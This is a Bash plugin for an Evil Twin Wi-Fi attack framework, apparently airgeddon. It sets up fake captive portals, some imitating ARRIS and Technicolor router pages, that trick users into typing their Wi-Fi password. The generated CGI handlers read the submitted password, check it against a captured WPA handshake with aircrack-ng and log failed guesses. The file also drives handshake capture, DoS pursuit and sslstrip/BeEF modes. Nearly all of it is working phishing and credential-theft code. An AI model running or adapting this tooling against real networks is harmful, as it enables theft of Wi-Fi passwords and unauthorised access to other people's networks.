#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

plugin_name="Custom Portals"
plugin_description="Make it easier to create or reuse custom portals"
plugin_author="xpz3"

#Enable/Disable Plugin 1=Enabled, 0=Disabled
plugin_enabled=1

plugin_minimum_ag_affected_version="11.50"
plugin_maximum_ag_affected_version=""

plugin_distros_supported=("*")

customportals_enabled=0
customportals_absolute_script_path=""
customportals_relative_path=""
customportals_selected_portal=""
customportals_checkphpfile="check.php" #Do not change
customportals_updatephpfile="update.php" #Do not change
customportals_errorhtml="error.html" #Do not change
customportals_finalhtml="final.html" #Do not change
customportals_jsonresponseenable=true #Should be false for Technicolor_en.portal and ARRIS_en.portal. Will be changed automatically

#User defined variables

customportals_possible_password_fields="password|password1|passphrase|key|key1|wpa|wpa_psw" #The password field should match any of these
customportals_php_handle=1 #This must be set to 1 for included portals to work. Set to 0 if you want to use your own custom portals that uses php

#shellcheck disable=SC2164
function customportals_get_absolute_script_path() {

	debug_print

	if [ "${0}" != "${scriptname}" ];then
		customportals_relative_path=$(pwd)
		cd "${customportals_relative_path}"
		cd "${0%/*}"
		customportals_absolute_script_path=$(pwd)
	else
		customportals_absolute_script_path=$(pwd)
	fi
}

function customportals_create_updatephpfile() {

	debug_print

	exec 4>"${tmpdir}${webdir}${customportals_updatephpfile}"

		if [[ "${customportals_jsonresponseenable}" == true ]]; then
			customportals_success_response='echo "{\"success\": true}"'
			customportals_fail_response='echo "{\"success\": false}"'
			customportals_short_password_response='echo "{\"success\": false}"'
			customportals_no_password_response='echo "{\"success\": false}"'
		else
			customportals_success_response='echo -n "authenticated"'
			customportals_fail_response="echo "${et_misc_texts[${captive_portal_language},17]}
			customportals_short_password_response="echo "${et_misc_texts[${captive_portal_language},26]}
			customportals_no_password_response='echo "<script type=\"text/javascript\">"; echo -e "\tsetTimeout(\"redirect()\", 3500);"; echo "</script>"'
		fi

		cat >&4 <<-EOF
			#!/usr/bin/env bash

			POST_DATA=\$(cat /dev/stdin)
			if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
				POST_DATA=\$(echo "\${POST_DATA}" | grep -oP '\b(${customportals_possible_password_fields})=\K[^&]*')
				password=\${POST_DATA//+/ }
				password=\${password//[*&\/?<>]}
				password=\$(printf '%b' "\${password//%/\\\x}")
				password=\${password//[*&\/?<>]}
			fi

			if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
				echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
				if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
					${customportals_success_response}
					et_successful=1
				else
					echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
					${customportals_fail_response}
					et_successful=0
				fi
			elif [[ "\${#password}" -gt 0 ]] && [[ "\${#password}" -lt 8 ]]; then
				${customportals_short_password_response}
				et_successful=0
			else
				${customportals_no_password_response}
				et_successful=0
			fi
		EOF

	exec 4>&-

}

function customportals_create_checkphpfile() {

	debug_print

	exec 4>"${tmpdir}${webdir}${customportals_checkphpfile}"

		cat >&4 <<-EOF
			#!/usr/bin/env bash

			echo '<!DOCTYPE html>'
			echo '<html>'
			echo -e '\t<head>'
			echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
			echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
			echo -e '\t</head>'
			echo -e '\t<body></body></html>'
			POST_DATA=\$(cat /dev/stdin)
			if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
				POST_DATA=\$(echo "\${POST_DATA}" | grep -oP '\b(${customportals_possible_password_fields})=\K[^&]*')
				password=\${POST_DATA//+/ }
				password=\${password//[*&\/?<>]}
				password=\$(printf '%b' "\${password//%/\\\x}")
				password=\${password//[*&\/?<>]}
			fi

			if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
				echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
				if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
					echo '<script type="text/javascript">'
					echo -e '\tsetTimeout("redirectfinal()", 100);'
					echo '</script>'
					et_successful=1
				else
					echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
					echo '<script type="text/javascript">'
					echo -e '\tsetTimeout("redirecterror()", 100);'
					echo '</script>'
					et_successful=0
				fi
			elif [[ "\${#password}" -gt 0 ]] && [[ "\${#password}" -lt 8 ]]; then
				echo '<script type="text/javascript">'
				echo -e '\tsetTimeout("redirecterror()", 100);'
				echo '</script>'
				et_successful=0
			else
				echo '<script type="text/javascript">'
				echo -e '\tsetTimeout("redirect()", 100);'
				echo '</script>'
				et_successful=0
			fi
		EOF

		exec 4>&-
}

function customportals_create_post_handler_files() {

	debug_print

	customportals_create_updatephpfile
	customportals_create_checkphpfile
	if [[ -f "${tmpdir}${webdir}${customportals_errorhtml}" ]]; then
		awk '{gsub(/onclick="history\.back\(\);return false"/, "onclick=\"parent.location.href = '\''index.htm'\'';return false\"")}1' "${tmpdir}${webdir}${customportals_errorhtml}" > "${tmpdir}${webdir}"temp.html && mv "${tmpdir}${webdir}"temp.html "${tmpdir}${webdir}${customportals_errorhtml}"
	fi
}

function customportals_prepare_custom_portal() {

	debug_print

	customportals_portal_directory="${customportals_absolute_script_path}"plugins/customportals/

	cp -r "${customportals_portal_directory}${customportals_selected_portal}"/* "${tmpdir}${webdir}"

	for file in "${tmpdir}${webdir}"*.htm; do
		[ -e "$file" ] && mv "$file" "${file%.htm}.html"
	done

	customportals_create_post_handler_files
}

function customportals_override_set_webserver_config() {

	debug_print

	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1

	{
	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_auth\","
	echo -e "\"mod_cgi\","
	echo -e "\"mod_redirect\","
	echo -e "\"mod_accesslog\""
	echo -e ")\n"
	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "server.bind = \"${et_ip_router}\""
	echo -e "server.port = ${www_port}\n"
	echo -e "index-file.names = (\"${indexfile}\")"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "\".css\" => \"text/css\","
	echo -e "\".html\" => \"text/html\","
	echo -e "\".js\" => \"text/javascript\""
	echo -e ")\n"
	echo -e "cgi.assign = (\".htm\" => \"/bin/bash\""
	} >> "${tmpdir}${webserver_file}"

	if [ "${customportals_php_handle}" -eq 1 ]; then
		echo -e ",\".php\" => \"/bin/bash\"" >> "${tmpdir}${webserver_file}"
	fi

	{
	echo -e ")\n"
	echo -e "accesslog.filename = \"${tmpdir}${webserver_log}\""
	echo -e "accesslog.escaping = \"default\""
	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\""
	echo -e "\$HTTP[\"remote-ip\"] == \"${loopback_ip}\" { accesslog.filename = \"\" }"
	} >> "${tmpdir}${webserver_file}"

	sleep 2
}

function customportals_override_set_captive_portal_page() {

	debug_print

	{
	echo -e "body * {"
	echo -e "\tbox-sizing: border-box;"
	echo -e "\tfont-family: Helvetica, Arial, sans-serif;"
	echo -e "}\n"
	echo -e ".button {"
	echo -e "\tcolor: #ffffff;"
	echo -e "\tbackground-color: ${captive_portal_button_color};"
	echo -e "\tborder-radius: 5px;"
	echo -e "\tcursor: pointer;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e ".content {"
	echo -e "\twidth: 100%;"
	echo -e "\tbackground-color: ${captive_portal_bg_color};"
	echo -e "\tpadding: 20px;"
	echo -e "\tmargin: 15px auto 0;"
	echo -e "\tborder-radius: 15px;"
	echo -e "\tcolor: #ffffff;"
	echo -e "}\n"
	echo -e ".title {"
	echo -e "\ttext-align: center;"
	echo -e "\tmargin-bottom: 15px;"
	echo -e "}\n"
	echo -e "#password {"
	echo -e "\twidth: 100%;"
	echo -e "\tmargin-bottom: 5px;"
	echo -e "\tborder-radius: 5px;"
	echo -e "\theight: 30px;"
	echo -e "}\n"
	echo -e "#password:hover,"
	echo -e "#password:focus {"
	echo -e "\tbox-shadow: 0 0 10px ${captive_portal_shadow_color};"
	echo -e "}\n"
	echo -e ".bold {"
	echo -e "\tfont-weight: bold;"
	echo -e "}\n"
	echo -e "#showpass {"
	echo -e "\tvertical-align: top;"
	echo -e "}\n"
	echo -e "@media screen and (min-width: 1000px) {"
	echo -e "\t.content {"
	echo -e "\t\twidth: 50%;"
	echo -e "\t\tposition: absolute;"
	echo -e "\t\ttop: 50%;"
	echo -e "\t\tleft: 50%;"
	echo -e "\t\ttransform: translate(-50%, -50%);"
	echo -e "\t}"
	echo -e "}\n"
	} >> "${tmpdir}${webdir}${cssfile}"

	if [ "${customportals_enabled}" -eq 1 ]; then
		customportals_prepare_custom_portal
		{
		echo -e "(function() {\n"
		echo -e "\tvar onLoad = function() {"
		echo -e "\t\tvar password = document.getElementById(\"password\");"
		echo -e "\t\tvar toggle = document.getElementById(\"showpass\");"
		echo -e "\t\tif (password) {"
		echo -e "\t\t\tpassword.oninvalid = function() {"
		echo -e "\t\t\t\tthis.setCustomValidity(\"${et_misc_texts[${captive_portal_language},16]}\");"
		echo -e "\t\t\t};"
		echo -e "\t\t\tpassword.oninput = function() {"
		echo -e "\t\t\t\tthis.setCustomValidity(\"\");"
		echo -e "\t\t\t};"
		echo -e "\t\t}\n"
		echo -e "\t\tif (password && toggle) {"
		echo -e "\t\t\ttoggle.addEventListener(\"click\", function() {"
		echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type === \"text\" ? \"password\" : \"text\");"
		echo -e "\t\t\t});"
		echo -e "\t\t\ttoggle.checked = false;"
		echo -e "\t\t}"
		echo -e "\t};\n"
		echo -e "\tif (document.readyState !== 'loading') onLoad(); else document.addEventListener('DOMContentLoaded', onLoad);"
		echo -e "})();\n"
		echo -e "function redirect() {"
		echo -e "\ttop.location.href = \"${indexfile}\";"
		echo -e "}\n"
		echo -e "function redirecterror() {"
		echo -e "\tdocument.location = \"${customportals_errorhtml}\";"
		echo -e "}\n"
		echo -e "function redirectfinal() {"
		echo -e "\tdocument.location = \"${customportals_finalhtml}\";"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${jsfile}"

		{
		echo -e "#!/usr/bin/env bash"
		echo -e "echo 'Content-Type: text/html'"
		echo -e "echo ''"
		echo -e "awk '"
		echo -e "BEGIN { injected = 0 }"
		echo -e "{"
		echo -e "if (\$0 ~ /<\/head>/ && injected == 0) {"
		echo -e "sub(/<\/head>/, \"<script>var img = new Image(); img.src = \\\"pixel.png\\\";</script></head>\");"
		echo -e "injected = 1;"
		echo -e "}"
		echo -e "print;"
		echo -e "}"
		echo -e "END {"
		echo -e "if (injected == 0) {"
		echo -e "print \"<script>var img = new Image(); img.src = \\\"pixel.png\\\";</script>\";"
		echo -e "}"
		echo -e "}"
		echo -e "' index.html"
		echo -e "exit 0"
		} >> "${tmpdir}${webdir}${indexfile}"

		base64 -d <<< "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdj+P///38ACfsD/QVDRcoAAAAASUVORK5CYII=" > "${tmpdir}${webdir}${pixelfile}"

		exec 4>"${tmpdir}${webdir}${checkfile}"

		cat >&4 <<-EOF
			#!/usr/bin/env bash

			echo '<!DOCTYPE html>'
			echo '<html>'
			echo -e '\t<head>'
			echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
			echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
			echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
			echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
			echo -e '\t</head>'
			echo -e '\t<body>'
			echo -e '\t\t<div class="content">'
			echo -e '\t\t\t<center><p>'

			POST_DATA=\$(cat /dev/stdin)
			if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
				POST_DATA=\$(echo "\${POST_DATA}" | grep -oP '\b(${customportals_possible_password_fields})=\K[^&]*')
				password=\${POST_DATA//+/ }
				password=\${password//[*&\/?<>]}
				password=\$(printf '%b' "\${password//%/\\\x}")
				password=\${password//[*&\/?<>]}
			fi

			if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
				echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
				if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
					echo '${et_misc_texts[${captive_portal_language},18]}'
					et_successful=1
				else
					echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
					echo '${et_misc_texts[${captive_portal_language},17]}'
					et_successful=0
				fi
			elif [[ "\${#password}" -gt 0 ]] && [[ "\${#password}" -lt 8 ]]; then
				echo '${et_misc_texts[${captive_portal_language},26]}'
				et_successful=0
			else
				echo '${et_misc_texts[${captive_portal_language},14]}'
				et_successful=0
			fi

			echo -e '\t\t\t</p></center>'
			echo -e '\t\t</div>'
			echo -e '\t</body>'
			echo '</html>'

			if [ "\${et_successful}" -eq 1 ]; then
				exit 0
			else
				echo '<script type="text/javascript">'
				echo -e '\tsetTimeout("redirect()", 3500);'
				echo '</script>'
				exit 1
			fi
		EOF

		exec 4>&-
		sleep 3
	else
		{
		echo -e "(function() {\n"
		echo -e "\tvar onLoad = function() {"
		echo -e "\t\tvar password = document.getElementById(\"password\");"
		echo -e "\t\tvar toggle = document.getElementById(\"showpass\");"

		echo -e "\t\tif (password) {"
		echo -e "\t\t\tpassword.oninvalid = function() {"
		echo -e "\t\t\t\tthis.setCustomValidity(\"${et_misc_texts[${captive_portal_language},16]}\");"
		echo -e "\t\t\t};"
		echo -e "\t\t\tpassword.oninput = function() {"
		echo -e "\t\t\t\tthis.setCustomValidity(\"\");"
		echo -e "\t\t\t};"
		echo -e "\t\t}\n"
		echo -e "\t\tif (password && toggle) {"
		echo -e "\t\t\ttoggle.addEventListener(\"click\", function() {"
		echo -e "\t\t\t\tpassword.setAttribute(\"type\", password.type === \"text\" ? \"password\" : \"text\");"
		echo -e "\t\t\t});"
		echo -e "\t\t\ttoggle.checked = false;"
		echo -e "\t\t}"
		echo -e "\t};\n"
		echo -e "\tif (document.readyState !== 'loading') onLoad(); else document.addEventListener('DOMContentLoaded', onLoad);"
		echo -e "})();\n"
		echo -e "function redirect() {"
		echo -e "\tdocument.location = \"${indexfile}\";"
		echo -e "}\n"
		} >> "${tmpdir}${webdir}${jsfile}"

		{
		echo -e "#!/usr/bin/env bash"
		echo -e "echo '<!DOCTYPE html>'"
		echo -e "echo '<html>'"
		echo -e "echo -e '\t<head>'"
		echo -e "echo -e '\t\t<meta name=\"viewport\" content=\"width=device-width\"/>'"
		echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
		echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
		echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
		echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
		echo -e "echo -e '\t</head>'"
		echo -e "echo -e '\t<body>'"
		echo -e "echo -e '\t\t<img src=\"${pixelfile}\" style=\"display: none;\"/>'"
		echo -e "echo -e '\t\t<div class=\"content\">'"
		echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
		if [ "${advanced_captive_portal}" -eq 1 ]; then
			echo -e "echo -e '${captive_portal_logo}'"
		fi
		echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
		echo -e "echo -e '\t\t\t\t\t<p>${et_misc_texts[${captive_portal_language},9]}</p>'"
		echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
		echo -e "echo -e '\t\t\t\t</div>'"
		echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},10]}</p>'"
		echo -e "echo -e '\t\t\t\t<label>'"
		echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"${et_misc_texts[${captive_portal_language},11]}\" pattern=\".{8,}\" required/><br/>'"
		echo -e "echo -e '\t\t\t\t</label>'"
		echo -e "echo -e '\t\t\t\t<p>${et_misc_texts[${captive_portal_language},12]} <input type=\"checkbox\" id=\"showpass\"/></p>'"
		echo -e "echo -e '\t\t\t\t<button class=\"button\" type=\"submit\">${et_misc_texts[${captive_portal_language},13]}</button>'"
		echo -e "echo -e '\t\t\t</form>'"
		echo -e "echo -e '\t\t</div>'"
		echo -e "echo -e '\t</body>'"
		echo -e "echo '</html>'"
		echo -e "exit 0"
		} >> "${tmpdir}${webdir}${indexfile}"

		base64 -d <<< "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdj+P///38ACfsD/QVDRcoAAAAASUVORK5CYII=" > "${tmpdir}${webdir}${pixelfile}"

		exec 4>"${tmpdir}${webdir}${checkfile}"

		cat >&4 <<-EOF
			#!/usr/bin/env bash

			echo '<!DOCTYPE html>'
			echo '<html>'
			echo -e '\t<head>'
			echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
			echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
			echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
			echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
			echo -e '\t</head>'
			echo -e '\t<body>'
			echo -e '\t\t<div class="content">'
			echo -e '\t\t\t<center><p>'

			POST_DATA=\$(cat /dev/stdin)
			if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
				POST_DATA=\${POST_DATA#*=}
				password=\${POST_DATA//+/ }
				password=\${password//[*&\/?<>]}
				password=\$(printf '%b' "\${password//%/\\\x}")
				password=\${password//[*&\/?<>]}
			fi

			if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
				echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
				if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
					echo '${et_misc_texts[${captive_portal_language},18]}'
					et_successful=1
				else
					echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
					echo '${et_misc_texts[${captive_portal_language},17]}'
					et_successful=0
				fi
			elif [[ "\${#password}" -gt 0 ]] && [[ "\${#password}" -lt 8 ]]; then
				echo '${et_misc_texts[${captive_portal_language},26]}'
				et_successful=0
			else
				echo '${et_misc_texts[${captive_portal_language},14]}'
				et_successful=0
			fi

			echo -e '\t\t\t</p></center>'
			echo -e '\t\t</div>'
			echo -e '\t</body>'
			echo '</html>'

			if [ "\${et_successful}" -eq 1 ]; then
				exit 0
			else
				echo '<script type="text/javascript">'
				echo -e '\tsetTimeout("redirect()", 3500);'
				echo '</script>'
				exit 1
			fi
		EOF

		exec 4>&-
		sleep 3
	fi
}

function customportals_override_set_captive_portal_language() {

	debug_print

	clear
	print_iface_selected
	print_et_target_vars
	print_iface_internet_selected
	captive_portal_language="ENGLISH"

	ask_yesno "customportals_text_1" "no"
	if [ "${yesno}" = "y" ]; then
		customportals_enabled=1
		if [ -z "${customportals_portal_directory}" ]; then
			customportals_portal_directory="${customportals_absolute_script_path}"plugins/customportals/
		fi

		if [ ! -d "${customportals_portal_directory}" ]; then
			mkdir -p "${customportals_portal_directory}"
		fi

		local custom_portals=()
		for entry in "${customportals_portal_directory}"*; do
			if [ -d "$entry" ]; then
				custom_portals+=("$(basename "$entry")")
			fi
		done

		if [ ${#custom_portals[@]} -eq 0 ]; then
			echo
			language_strings "${language}" "customportals_text_3" "red"
			echo
			language_strings "${language}" 115 "read"
			customportals_enabled=0
			return_to_et_main_menu=1
			return 1
		fi

		echo
		language_strings "${language}" "customportals_text_2" "blue"

		for i in "${!custom_portals[@]}"; do
			echo "$((i + 1)). ${custom_portals[i]}"
		done

		echo
		language_strings "${language}" "customportals_text_4" "green"
		local customportal_selection
		read -r customportal_selection

		if [[ "${customportal_selection}" =~ ^[0-9]+$ ]] && [ "${customportal_selection}" -ge 1 ] && [ "${customportal_selection}" -le "${#custom_portals[@]}" ]; then
			customportals_selected_portal="${custom_portals[$((customportal_selection - 1))]}"

			language_strings "${language}" "customportals_text_5" "green"

			if [[ "${customportals_selected_portal}" == "ARRIS_en.portal" || "${customportals_selected_portal}" == "Technicolor_en.portal" ]];then
				customportals_jsonresponseenable=false
			else
				customportals_jsonresponseenable=true
			fi
		else
			echo
			language_strings "${language}" "customportals_text_6" "red"
			echo
			language_strings "${language}" 115 "read"
			customportals_enabled=0
			return_to_et_main_menu=1
			return 1
		fi
	else
		customportals_enabled=0
		clear
		language_strings "${language}" 293 "title"
		print_iface_selected
		print_et_target_vars
		print_iface_internet_selected
		echo
		language_strings "${language}" 318 "green"
		print_simple_separator
		language_strings "${language}" 266
		print_simple_separator
		language_strings "${language}" 79
		language_strings "${language}" 80
		language_strings "${language}" 113
		language_strings "${language}" 116
		language_strings "${language}" 249
		language_strings "${language}" 308
		language_strings "${language}" 320
		language_strings "${language}" 482
		language_strings "${language}" 58
		language_strings "${language}" 331
		language_strings "${language}" 519
		language_strings "${language}" 687
		language_strings "${language}" 717
		print_hint

		read -rp "> " captive_portal_language_selected
		echo
		case ${captive_portal_language_selected} in
			0)
				return_to_et_main_menu=1
				return 1
			;;
			1)
				captive_portal_language="ENGLISH"
			;;
			2)
				captive_portal_language="SPANISH"
			;;
			3)
				captive_portal_language="FRENCH"
			;;
			4)
				captive_portal_language="CATALAN"
			;;
			5)
				captive_portal_language="PORTUGUESE"
			;;
			6)
				captive_portal_language="RUSSIAN"
			;;
			7)
				captive_portal_language="GREEK"
			;;
			8)
				captive_portal_language="ITALIAN"
			;;
			9)
				captive_portal_language="POLISH"
			;;
			10)
				captive_portal_language="GERMAN"
			;;
			11)
				captive_portal_language="TURKISH"
			;;
			12)
				captive_portal_language="ARABIC"
			;;
			13)
				captive_portal_language="CHINESE"
			;;
			*)
				invalid_captive_portal_language_selected
			;;
		esac
	fi

	return 0
}

#shellcheck disable=SC2010
function customportals_set_path() {

	debug_print

	if [[ $(ls "${scriptfolder}" | grep "${scriptname}") == "" ]];then
		customportals_get_absolute_script_path
	else
		customportals_absolute_script_path="${scriptfolder}"
	fi
}

function customportals_override_et_prerequisites() {

	debug_print

	if [ "${retry_handshake_capture}" -eq 1 ]; then
		return
	fi

	clear
	if [ -n "${enterprise_mode}" ]; then
		current_menu="enterprise_attacks_menu"
		case ${enterprise_mode} in
			"smooth")
				language_strings "${language}" 522 "title"
			;;
			"noisy")
				language_strings "${language}" 523 "title"
			;;
		esac
	else
		current_menu="evil_twin_attacks_menu"
		case ${et_mode} in
			"et_onlyap")
				language_strings "${language}" 270 "title"
			;;
			"et_sniffing")
				language_strings "${language}" 291 "title"
			;;
			"et_sniffing_sslstrip2")
				language_strings "${language}" 292 "title"
			;;
			"et_sniffing_sslstrip2_beef")
				language_strings "${language}" 397 "title"
			;;
			"et_captive_portal")
				language_strings "${language}" 293 "title"
			;;
		esac
	fi

	print_iface_selected
	if [ -n "${enterprise_mode}" ]; then
		print_all_target_vars
	else
		print_et_target_vars
		print_iface_internet_selected
	fi

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 512 "blue"
	fi
	print_hint
	echo

	if [ "${et_mode}" != "et_captive_portal" ]; then
		language_strings "${language}" 275 "blue"
		echo
		language_strings "${language}" 276 "yellow"
		print_simple_separator
		ask_yesno 277 "yes"
		if [ "${yesno}" = "n" ]; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
				return_to_et_main_menu_from_beef=1
			fi
			return
		fi
	fi

	if [[ -z "${mac_spoofing_desired}" ]] || [[ "${mac_spoofing_desired}" -eq 0 ]]; then
		ask_yesno 419 "no"
		if [ "${yesno}" = "y" ]; then
			mac_spoofing_desired=1
		fi
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then

		language_strings "${language}" 315 "yellow"
		echo
		language_strings "${language}" 286 "pink"
		print_simple_separator
		if [ "${retrying_handshake_capture}" -eq 0 ]; then
			ask_yesno 321 "no"
		fi

		local msg_mode
		msg_mode="showing_msgs_checking"

		if [[ "${yesno}" = "n" ]] || [[ "${retrying_handshake_capture}" -eq 1 ]]; then
			msg_mode="silent"
			capture_handshake_evil_twin
			case "$?" in
				"2")
					retry_handshake_capture=1
					return
				;;
				"1")
					return_to_et_main_menu=1
					return
				;;
			esac
		else
			ask_et_handshake_file
		fi
		retry_handshake_capture=0
		retrying_handshake_capture=0

		if ! check_bssid_in_captured_file "${et_handshake}" "${msg_mode}" "also_pmkid"; then
			return_to_et_main_menu=1
			return
		fi

		echo
		language_strings "${language}" 28 "blue"

		echo
		language_strings "${language}" 26 "blue"

		echo
		language_strings "${language}" 31 "blue"
	else
		if ! ask_bssid; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
				return_to_et_main_menu_from_beef=1
			fi
			return
		fi

		if ! ask_channel; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
			fi
			return
		else
			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"
				if [ -n "${enterprise_mode}" ]; then
					return_to_enterprise_main_menu=1
				else
					return_to_et_main_menu=1
				fi
				return
			fi
		fi
		ask_essid "noverify"
	fi

	if [ -n "${enterprise_mode}" ]; then
		if ! validate_network_type "enterprise"; then
			return_to_enterprise_main_menu=1
			return
		fi
	else
		if ! validate_network_type "personal"; then
			return_to_et_main_menu=1
			return
		fi
	fi

	if [ -n "${enterprise_mode}" ]; then
		manage_enterprise_log
	elif [ "${et_mode}" = "et_sniffing" ]; then
		manage_ettercap_log
	elif [[ "${et_mode}" = "et_sniffing_sslstrip2" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]]; then
		manage_bettercap_log
	elif [ "${et_mode}" = "et_captive_portal" ]; then
		manage_captive_portal_log
		language_strings "${language}" 115 "read"
		if set_captive_portal_language; then
			if [ "${customportals_enabled}" -eq 0 ];then
				language_strings "${language}" 319 "blue"
				ask_yesno 710 "no"
				if [ "${yesno}" = "y" ]; then
					advanced_captive_portal=1
				fi
			fi

			prepare_captive_portal_data

			echo
			language_strings "${language}" 711 "blue"
		else
			return
		fi
	fi

	if [ -n "${enterprise_mode}" ]; then
		return_to_enterprise_main_menu=1
	else
		return_to_et_main_menu=1
		return_to_et_main_menu_from_beef=1
	fi

	if [ "${is_docker}" -eq 1 ]; then
		echo
		if [ -n "${enterprise_mode}" ]; then
			language_strings "${language}" 528 "pink"
		else
			language_strings "${language}" 420 "pink"
		fi
		language_strings "${language}" 115 "read"
	fi

	region_check

	if [ "${channel}" -gt 14 ]; then
		echo
		if [ "${country_code}" = "00" ]; then
			language_strings "${language}" 706 "yellow"
		elif [ "${country_code}" = "99" ]; then
			language_strings "${language}" 719 "yellow"
		else
			language_strings "${language}" 392 "blue"
		fi
	fi

	if hash arping-th 2> /dev/null; then
		right_arping=1
		right_arping_command="arping-th"
	elif hash arping 2> /dev/null; then
		if check_right_arping; then
			right_arping=1
		else
			echo
			language_strings "${language}" 722 "yellow"
			language_strings "${language}" 115 "read"
		fi
	fi

	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"
	prepare_et_interface

	rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
	echo "${channel}" > "${tmpdir}${channelfile}"

	if [ -n "${enterprise_mode}" ]; then
		exec_enterprise_attack
	else
		case ${et_mode} in
			"et_onlyap")
				exec_et_onlyap_attack
			;;
			"et_sniffing")
				exec_et_sniffing_attack
			;;
			"et_sniffing_sslstrip2")
				exec_et_sniffing_sslstrip2_attack
			;;
			"et_sniffing_sslstrip2_beef")
				exec_et_sniffing_sslstrip2_beef_attack
			;;
			"et_captive_portal")
				exec_et_captive_portal_attack
			;;
		esac
	fi
}

#Prehook for hookable_for_languages function to modify language strings
